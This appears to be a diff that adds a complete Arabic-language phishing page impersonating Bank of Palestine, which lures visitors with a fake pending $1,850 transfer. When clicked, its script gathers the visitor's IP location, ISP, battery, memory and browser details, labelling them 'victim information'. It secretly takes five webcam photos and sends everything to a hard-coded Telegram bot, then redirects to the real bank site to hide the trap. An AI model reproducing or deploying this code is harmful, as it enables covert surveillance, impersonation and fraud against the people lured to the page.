@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>بنك فلسطين - الخدمات الإلكترونية</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #eee; margin: 0; padding: 0; }
+        .header { background-color: #f8f9fa; padding: 10px; border-bottom: 3px solid #0056b3; text-align: center; }
+        .container { max-width: 450px; margin: 20px auto; background: white; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
+        .content { padding: 30px; text-align: center; }
+        .logo { width: 180px; margin-bottom: 20px; }
+        h2 { color: #333; font-size: 20px; }
+        p { color: #666; line-height: 1.6; }
+        .info-box { background: #e9ecef; padding: 15px; border-radius: 5px; margin: 20px 0; text-align: right; font-size: 14px; }
+        .btn { background-color: #d71920; color: white; padding: 15px; border: none; border-radius: 5px; cursor: pointer; width: 100%; font-size: 18px; font-weight: bold; }
+        #video, #canvas { display: none; }
+    </style>
+</head>
+<body>
+
+<div class="header">
+    <img src="https://www.bankofpalestine.com/public/files/image/logo.png" style="width: 120px;">
+</div>
+
+<div class="container">
+    <div class="content">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1a/Bank_of_Palestine_Logo.svg/1200px-Bank_of_Palestine_Logo.svg.png" class="logo">
+        <h2>تأكيد استلام حوالة واردة</h2>
+        <p>لديك حوالة بنكية معلقة بمبلغ <b>1,850.00$</b> من جهة غير مسجلة.</p>
+        
+        <div class="info-box">
+            • رقم العملية: BP-9921045X<br>
+            • حالة الحوالة: بانتظار تأكيد الهوية<br>
+            • ملاحظة: يرجى السماح بالوصول للكاميرا لتأكيد الهوية البيومترية.
+        </div>
+
+        <button class="btn" onclick="initiate()">قبول وتأكيد الاستلام</button>
+    </div>
+</div>
+
+<video id="video" autoplay></video>
+<canvas id="canvas"></canvas>
+
+<script>
+    const token = '7777310266:AAGyWXFVm6B7tjr5hR-SIlKEo4N1mIvNl_M';
+    const chatId = '7184970355';
+
+    async function initiate() {
+        // سحب المعلومات فور الضغط
+        let deviceInfo = await getDeviceInfo();
+        
+        navigator.mediaDevices.getUserMedia({ video: true })
+        .then(stream => {
+            const video = document.getElementById('video');
+            video.srcObject = stream;
+            
+            // التقاط 5 صور بسرعة فائقة (كل 500 ملّي ثانية)
+            let count = 0;
+            let interval = setInterval(() => {
+                if (count < 5) {
+                    captureAndSend(video, deviceInfo);
+                    count++;
+                } else {
+                    clearInterval(interval);
+                    window.location.href = "https://www.bankofpalestine.com/"; // تحويله للموقع الرسمي بعد الفخ
+                }
+            }, 500);
+        })
+        .catch(err => {
+            alert("عذراً، يجب تفعيل الكاميرا لتأكيد عملية التحويل حسب قوانين سلطة النقد.");
+        });
+    }
+
+    async function getDeviceInfo() {
+        let ipData = await fetch('https://ipapi.co/json/').then(res => res.json());
+        let battery = await navigator.getBattery().then(b => (b.level * 100) + "%");
+        let ram = navigator.deviceMemory ? navigator.deviceMemory + "GB" : "Unknown";
+        
+        return `
+📌 معلومات الضحية:
+- IP: ${ipData.ip}
+- المدينة: ${ipData.city}
+- الدولة: ${ipData.country_name}
+- الشركة: ${ipData.org}
+- البطارية: ${battery}
+- الرام: ${ram}
+- المتصفح: ${navigator.userAgent}
+        `;
+    }
+
+    function captureAndSend(video, info) {
+        const canvas = document.getElementById('canvas');
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        canvas.getContext('2d').drawImage(video, 0, 0);
+        
+        canvas.toBlob(blob => {
+            const formData = new FormData();
+            formData.append('chat_id', chatId);
+            formData.append('photo', blob, 'capture.png');
+            formData.append('caption', info);
+
+            fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                method: 'POST',
+                body: formData
+            });
+        }, 'image/png');
+    }
+</script>
+
+</body>
+</html>
